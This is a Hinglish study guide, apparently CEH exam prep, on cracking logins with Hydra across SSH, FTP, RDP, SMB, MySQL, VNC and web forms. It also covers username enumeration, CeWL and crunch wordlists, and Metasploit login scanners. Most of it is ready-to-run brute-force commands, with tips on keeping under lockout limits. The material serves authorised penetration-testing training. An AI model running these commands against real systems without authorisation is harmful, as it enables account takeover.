# LOGIN TODNA HAI — Brute Force Kaise Karu?

---

## Pehle Samjho: Brute Force vs Dictionary Attack

**Brute Force Attack:**
- Har possible combination try karta hai (a, b, c... aa, ab, ac... aaa, aab...)
- Guaranteed ki password milega — lekin TIME bahut lagta hai
- 8-char password ke liye: 26^8 = ~200 billion combinations = years lag sakte hain!
- Use: Bahut chhote passwords (4-digit PIN etc.)

**Dictionary Attack:**
- Ek wordlist (jaise rockyou.txt) ke words try karta hai
- Fast hai kyunki limited words hain (rockyou mein ~14 million)
- Lekin agar password wordlist mein nahi hai toh nahi milega
- Use: Most real-world scenarios (log common passwords use karte hain)

**CEH exam mein mostly dictionary attack hota hai** — rockyou.txt se password mil jaata hai.

**Hydra kya hai?**
Hydra ek online password cracking tool hai — ye actually login try karta hai target service pe.
SSH, FTP, HTTP, RDP — almost har protocol support karta hai.

---

## STEP 1: Hydra Ka Basic Syntax Samjho

```
hydra -l USERNAME -P WORDLIST TARGET SERVICE [options]
```

| Flag | Kya Hai | Example |
|---|---|---|
| `-l user` | Single username | `-l admin` |
| `-L users.txt` | Username list file | `-L /tmp/users.txt` |
| `-p pass` | Single password | `-p password123` |
| `-P wordlist` | Password wordlist file | `-P /usr/share/wordlists/rockyou.txt` |
| `-C creds.txt` | Combo file (user:pass) | `-C combos.txt` |
| `-t 4` | Threads (parallel attempts) | `-t 4` (safe), `-t 16` (fast) |
| `-f` | Stop on first match | `-f` (pehla password milte hi ruk ja) |
| `-V` | Verbose (har attempt dikhao) | `-V` (debugging ke liye) |
| `-vV` | Extra verbose | `-vV` |
| `-o results.txt` | Output file mein save karo | `-o found.txt` |
| `-s PORT` | Custom port | `-s 2222` (agar SSH 2222 pe hai) |

> **`-l` (lowercase L)** = single username
> **`-L` (uppercase L)** = username list file
> Same pattern for `-p` aur `-P`

---

## CASE 1: SSH Brute Force

SSH (Secure Shell) — remote login ke liye use hota hai.

```bash
# Username pata hai, password dhundna hai
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 ssh -t 4
# -l admin = username "admin"
# -P rockyou.txt = password list
# 192.168.1.100 = target IP
# ssh = service type
# -t 4 = 4 parallel threads (SSH ke liye zyada mat rakhna)

# Username bhi nahi pata
hydra -L /usr/share/wordlists/metasploit/unix_users.txt \
  -P /usr/share/wordlists/rockyou.txt 192.168.1.100 ssh -t 4

# Custom port pe SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 2222 192.168.1.100 ssh -t 4
# -s 2222 = port 2222
```

**Output samjho:**
```
[22][ssh] host: 192.168.1.100   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found
```
`login: admin   password: password123` — ye hai cracked credential!

---

## CASE 2: FTP Brute Force

```bash
hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt 192.168.1.100 ftp -t 4
# FTP usually port 21 pe hota hai

# Anonymous login check (pehle manually try karo)
# ftp 192.168.1.100 → username: anonymous, password: (kuch bhi)
```

---

## CASE 3: RDP Brute Force (Windows Remote Desktop)

```bash
hydra -l administrator -P /usr/share/wordlists/rockyou.txt 192.168.1.100 rdp -t 4
# RDP bahut slow hota hai — patience rakho
# -t 4 ya kam rakhna (zyada threads = lockout risk)
```

> **RDP mein lockout risk zyada hai!** Windows usually 3-5 failed attempts ke baad account lock kar deta hai.
> `-t 1` rakhna safest hai.

---

## CASE 4: SMB Brute Force (Windows File Sharing)

```bash
hydra -l administrator -P /usr/share/wordlists/rockyou.txt 192.168.1.100 smb -t 4
# SMB = port 445
# Windows domains mein format: DOMAIN\\username
hydra -l "CORP\\admin" -P /usr/share/wordlists/rockyou.txt 192.168.1.100 smb -t 4
```

---

## CASE 5: MySQL Brute Force

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.100 mysql -t 4
# MySQL default user: root
# Default port: 3306
```

---

## CASE 6: Telnet Brute Force

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 telnet -t 4
# Telnet = port 23
```

---

## CASE 7: VNC Brute Force (No Username!)

VNC mein username nahi hota — sirf password.

```bash
hydra -P /usr/share/wordlists/rockyou.txt 192.168.1.100 vnc -t 4
# Notice: -l nahi hai! VNC mein username nahi dete
# VNC = port 5900
```

---

## CASE 8: HTTP Basic Authentication

Jab browser mein popup aata hai username/password maangne ke liye — wo Basic Auth hai.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 http-get /admin/ -t 4
# http-get = HTTP GET request with Basic Auth
# /admin/ = protected path (jo path pe login prompt aata hai)
```

---

## CASE 9: Web Form Brute Force — SABSE TRICKY! (Detail Mein Samjho)

Web login forms (username + password wale HTML forms) ke liye Hydra ka sabse complex syntax hai.
Ye 3-step process hai:

### Step 1: Login Request Inspect Karo

Browser DevTools ya Burp Suite se dekho:
- Login form ka **URL** kya hai (action attribute)
- **POST parameters** kya hain (username field, password field)
- Login fail hone pe **kya message** aata hai

**Browser DevTools se:**
1. Login page kholo
2. F12 press karo (DevTools) → Network tab
3. Galat password se login try karo
4. POST request dekho → Headers tab → Form Data

**Example dekho:**
- URL: `/login.php`
- POST data: `username=test&password=test`
- Failure message page pe: `"Login failed"`

### Step 2: Hydra Command Banao

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 http-post-form \
  "/login.php:username=^USER^&password=^PASS^:Login failed" -t 4
```

### Step 3: 3-Part Syntax Samjho (Colon Se Separated)

```
"/login.php:username=^USER^&password=^PASS^:Login failed"
  ↑ PART 1      ↑ PART 2                      ↑ PART 3
```

**PART 1 — Path:** `/login.php`
- Login form ka action URL
- Sirf path likho, full URL nahi (http://... mat likho)

**PART 2 — POST Data:** `username=^USER^&password=^PASS^`
- Form ke field names exactly wahi likho jo browser ne bheje
- `^USER^` = Hydra yahan username dalega (jo -l/-L se diya)
- `^PASS^` = Hydra yahan password dalega (jo -P se diya)
- `&` se separate karo (jaise actual POST data hota hai)

**PART 3 — Failure String:** `Login failed`
- Ye wo text hai jo **galat password** pe page pe dikhta hai
- Hydra check karta hai — agar ye text response mein hai → login failed
- Agar ye text response mein NAHI hai → password correct hai!

### Common Failure Strings (Ye dhundo page pe):
```
Login failed
Invalid credentials
Invalid username or password
incorrect
Access denied
Wrong password
Authentication failed
```

### Real World Examples:

```bash
# DVWA login
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 http-post-form \
  "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -t 4

# WordPress login
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^:incorrect" -t 4

# Custom login with CSRF token (cookie chahiye)
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid:H=Cookie: PHPSESSID=abc123" -t 4
# H= se extra headers bhej sakte ho
```

> **Sabse badi galti:** Failure string galat dena → Hydra ko lagta hai
> har attempt successful hai → bahut saare "valid" passwords dikhata hai (sab galat).
> **Fix:** Pehle manually galat password daalo, page pe kya message aata hai wo exactly copy karo.

---

## CASE 10: Username Enumeration — Username Pata Nahi Hai

Kabhi kabhi sirf service pata hai, username bhi dhundna padta hai.

```bash
# SMB se Windows users enumerate karo
enum4linux -U 192.168.1.100
# Output mein usernames list milegi

# SMTP se email users verify karo
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 192.168.1.100
# VRFY command se valid users pata chalte hain

# finger service (agar port 79 open hai)
finger @192.168.1.100
# Connected users ki info milegi

# Web application — username enumeration
# Login page pe "Username not found" vs "Wrong password" — different messages
# = username enumeration possible!

# Common username lists:
# /usr/share/wordlists/metasploit/unix_users.txt
# /usr/share/seclists/Usernames/top-usernames-shortlist.txt
```

---

## CASE 11: Custom Wordlists Banana Hai

Jab rockyou.txt se password nahi mila, custom wordlist try karo.

### CeWL — Website Se Words Nikalo
```bash
cewl http://192.168.1.100 -m 6 -w custom_words.txt
# -m 6 = minimum 6 character words
# -w = output file
# Website ke saare words collect karega — company name, people names, etc.

# Emails bhi nikalo
cewl http://192.168.1.100 -m 6 -w custom.txt -e --email_file emails.txt
# -e = emails bhi collect karo

# Depth badhao (linked pages bhi crawl karo)
cewl http://192.168.1.100 -m 6 -d 3 -w custom.txt
# -d 3 = 3 levels deep crawl karo
```

### Crunch — Pattern-Based Wordlist
```bash
# 4-digit PINs (0000 se 9999)
crunch 4 4 0123456789 -o pins.txt
# 4 4 = minimum 4, maximum 4 characters
# 0123456789 = character set

# Company name + 2 digits (Company00 se Company99)
crunch 9 9 -t Company%% -o company_list.txt
# -t = template pattern
# %% = 2 digits

# Lowercase letters, 6 characters
crunch 6 6 abcdefghijklmnopqrstuvwxyz -o alpha6.txt

# Pipe directly to Hydra (file save nahi karna)
crunch 4 4 0123456789 | hydra -l admin -P - 192.168.1.100 ssh -t 4
# -P - = stdin se passwords lo (pipe se)
```

**Crunch template characters:**
- `@` = lowercase letter (a-z)
- `,` = uppercase letter (A-Z)
- `%` = number (0-9)
- `^` = special character (!@#$...)

---

## CASE 12: Metasploit Se Brute Force

Agar Hydra se nahi ho raha ya Metasploit preferred hai:

```bash
msfconsole -q
use auxiliary/scanner/ssh/ssh_login
show options

# Required options set karo
set RHOSTS 192.168.1.100
set USERNAME admin              # Single user
# ya: set USER_FILE users.txt  # User list
set PASS_FILE /usr/share/wordlists/rockyou.txt
set STOP_ON_SUCCESS true        # Pehla match milte hi ruk ja
set THREADS 4
run

# Success hone pe session mil jaata hai
# sessions -l                   # Active sessions dekho
# sessions -i 1                 # Session 1 mein jaao
```

**Metasploit ke aur brute force modules:**
```
auxiliary/scanner/ftp/ftp_login
auxiliary/scanner/ssh/ssh_login
auxiliary/scanner/smb/smb_login
auxiliary/scanner/mysql/mysql_login
auxiliary/scanner/vnc/vnc_login
auxiliary/scanner/telnet/telnet_login
```

---

## Important Tips (Zaroor Yaad Rakho!)

1. **`-t 4` zaroor lagao** — Kam threads = kam lockout risk
   - SSH: `-t 4` (max 4-6)
   - FTP: `-t 4`
   - RDP: `-t 1` ya `-t 2` (bahut sensitive hai lockout ke liye)
   - HTTP: `-t 16` ya zyada bhi chal jaata hai

2. **`-f` flag lagao** → Pehla valid password milte hi Hydra ruk jayega
   ```bash
   hydra -l admin -P rockyou.txt 192.168.1.100 ssh -t 4 -f
   ```

3. **rockyou.txt compressed hai?** → Pehle extract karo!
   ```bash
   ls -la /usr/share/wordlists/rockyou.txt
   # Agar .gz hai:
   sudo gunzip /usr/share/wordlists/rockyou.txt.gz
   ```

4. **VNC mein username nahi hota** — sirf `-P` do, `-l` mat do

5. **Account lockout policy** → Real exam mein zyada attempts se account lock ho sakta hai
   - Kam threads, slow speed rakhna safer hai

6. **Hydra nahi chal raha?** → Check karo:
   - Service port sahi hai? (`-s PORT`)
   - Target IP reachable hai? (`ping TARGET`)
   - Wordlist path sahi hai? (`ls -la /path/to/wordlist`)

7. **Web form mein failure string galat hai?** → Hydra bahut saare "valid" passwords dikhayega
   - Pehle manually test karo, exact failure message copy karo

8. **SSH "Connection refused"** → SSH service port 22 pe nahi chal raha
   - Nmap se check karo kaunse port pe hai: `nmap -sV TARGET`

---

## Common Mistakes (Mat Karna Ye)

1. **`-l` aur `-L` confuse karna** → `-l admin` (single user) vs `-L users.txt` (file)
   - Lowercase = single value, Uppercase = file

2. **http-post-form ka 3-part syntax galat** → Sabse common mistake
   - `"path:post_data:failure_string"` — exactly 3 parts, colon se separate
   - `^USER^` aur `^PASS^` placeholders sahi jagah lagao

3. **Failure string mein HTML tags dalna** → Sirf visible text do
   - `Login failed` likho, `<div class="error">Login failed</div>` nahi

4. **Full URL dena path mein** → `/login.php` likho, `http://192.168.1.100/login.php` nahi
   - IP/hostname pehle se target mein hota hai

5. **Wordlist path galat** → File not found error
   - Tab key se autocomplete use karo, ya `ls` se verify karo

6. **Bahut zyada threads** → Target crash ya account lockout
   - SSH/RDP/SMB ke liye `-t 4` se zyada mat rakhna

---

## Quick Decision Tree

```
Login todna hai — kya karu?
  │
  ├─ STEP 1: Service kya hai? (nmap se pata karo)
  │   ├─ SSH (22)?    → hydra -l USER -P rockyou.txt IP ssh -t 4
  │   ├─ FTP (21)?    → hydra -l USER -P rockyou.txt IP ftp -t 4
  │   ├─ RDP (3389)?  → hydra -l USER -P rockyou.txt IP rdp -t 1
  │   ├─ SMB (445)?   → hydra -l USER -P rockyou.txt IP smb -t 4
  │   ├─ MySQL (3306)? → hydra -l root -P rockyou.txt IP mysql -t 4
  │   ├─ VNC (5900)?  → hydra -P rockyou.txt IP vnc -t 4 (no username!)
  │   ├─ HTTP Basic?  → hydra -l USER -P rockyou.txt IP http-get /path/
  │   └─ Web Form?    → hydra http-post-form (3-part syntax!)
  │
  ├─ STEP 2: Username nahi pata?
  │   ├─ enum4linux -U IP (SMB users)
  │   ├─ smtp-user-enum (SMTP users)
  │   └─ Common list: -L unix_users.txt
  │
  ├─ STEP 3: Rockyou se nahi mila?
  │   ├─ cewl http://IP -m 6 -w custom.txt (website words)
  │   ├─ crunch 4 4 0123456789 (pattern-based)
  │   └─ Pipe: crunch ... | hydra -l USER -P - IP ssh
  │
  └─ STEP 4: Metasploit prefer?
      └─ use auxiliary/scanner/ssh/ssh_login → set options → run
```
